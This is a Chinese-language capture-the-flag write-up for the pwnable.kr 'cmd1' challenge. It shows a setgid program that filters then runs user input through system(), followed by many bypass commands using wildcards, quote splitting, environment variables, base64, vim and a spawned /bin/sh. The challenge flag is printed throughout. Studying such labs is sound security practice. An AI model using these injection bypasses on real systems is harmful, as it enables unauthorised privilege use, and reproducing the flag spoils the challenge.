```
cmd1 - 1 pt

Mommy! what is PATH environment in Linux?

ssh cmd1@pwnable.kr -p2222 (pw:guest)
```

登陆服务器之后，cmd1有cmd1_pwn的group权限，可以读flag。

```bash
cmd1@ubuntu:~$ ls -l
total 20
-r-xr-sr-x 1 root cmd1_pwn 8513 Jul 14  2015 cmd1
-rw-r--r-- 1 root root      320 Mar 23  2018 cmd1.c
-r--r----- 1 root cmd1_pwn   48 Jul 14  2015 flag
```

本关的代码量不是很大，直接看源码吧。

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/thankyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}
```

给r复制时的反汇编如下：

```asm
call    _strstr        
test    rax, rax      ;// 判断返回值是否为，影响ZF标志位
setnz   al		      ;// set if not zero，如果ZF为1，al为0。如果ZF为1，al为1。
movzx   eax, al       ;// 16位扩展为32位，movzx无符号扩展。movsx为有符号扩展
add     [rbp+var_4], eax   ;// 修改r的值
```



strstr是Standard C Library中的函数，看一下实现。

```
SYNOPSIS
     #include <string.h>
	 
     char * strstr(const char *haystack, const char *needle);
     
DESCRIPTION
     The strstr() function locates the first occurrence of the null-terminated string needle in the null-terminated string haystack.
     
RETURN VALUES
     If needle is an empty string, haystack is returned; if needle occurs nowhere in haystack,NULL is returned; otherwise a pointer to the first character of the first occurrence of needle is returned.
```

如果needle为空字符串，strstr返回haystack。如果needle没有出现，返回NULL。否则返回第一次匹配到的子串。

本关调用putenv修改了环境变量PATH,因此原先的命令需要用绝对路径去运行，或者export PATH恢复再使用。此外，filter了argv[1]，不能出现flag sh tmp这些字符串。最后调用system执行。本关很明显是要让我们找一些bypass方案了。



## flag

总结了一下目前的拿flag姿势。

```bash
# 通配符  cat fla* 可以读flag
cmd1@ubuntu:~$ ./cmd1 /b"in/cat /home/cmd1/fla*"
mommy now I get what PATH environment is for :)

# 字符串拼接 'f'la'g' 在bash中还是flag
cmd1@ubuntu:~$ echo 'f'la'g'
flag
cmd1@ubuntu:~$ ./cmd1 "/bin/cat /home/cmd1/'f'lag"
mommy now I get what PATH environment is for :)
cmd1@ubuntu:~$ echo 'f'lag
flag
cmd1@ubuntu:~$ echo "f"lag
flag
cmd1@ubuntu:~$ ./cmd1 "/bin/cat /home/cmd1/\"f\"lag"
mommy now I get what PATH environment is for :)

# env设置环境变量拿flag
cmd1@ubuntu:~$ env x='/bin/cat /home/cmd1/flag' ./cmd1 "\$x"
mommy now I get what PATH environment is for :)

#借助vim来打开文件
./cmd1 /usr/bin/vim
:e flag

# 转义一个不需要转义的字符 如\a
cmd1@ubuntu:~$ ./cmd1 "/bin/cat fl\ag"
mommy now I get what PATH environment is for :)

# base64 decode
cmd1@ubuntu:~$ ./cmd1 '/bin/cat $(echo "ZmxhZwo=" | /usr/bin/base64 -d)'
mommy now I get what PATH environment is for :)

# 直接写bash，简单粗暴 by v4r4n
cmd1@ubuntu:~$ echo /bin/cat /home/cmd1/flag > /var/lib/php/sessions/asd
cmd1@ubuntu:~$ chmod +x /var/lib/php/sessions/asd
cmd1@ubuntu:~$ ./cmd1 /var/lib/php/sessions/asd
mommy now I get what PATH environment is for :)

# more 查看当前目录下所有文件
./cmd1 "/bin/more *"
...

```

也有一个不太理解的。/bin/sh有cmd1_pwn权限，/bin/bash没有。

```bash
cmd1@ubuntu:~$ ./cmd1 "/bin/bas''h"
bash-4.3$ /usr/bin/id
uid=1025(cmd1) gid=1025(cmd1) groups=1025(cmd1)
bash-4.3$ exit
exit
cmd1@ubuntu:~$ ./cmd1 "/bin/s''h"
$ /usr/bin/id
uid=1025(cmd1) gid=1025(cmd1) egid=1026(cmd1_pwn) groups=1026(cmd1_pwn),1025(cmd1)
$ /bin/cat flag
mommy now I get what PATH environment is for :)
```

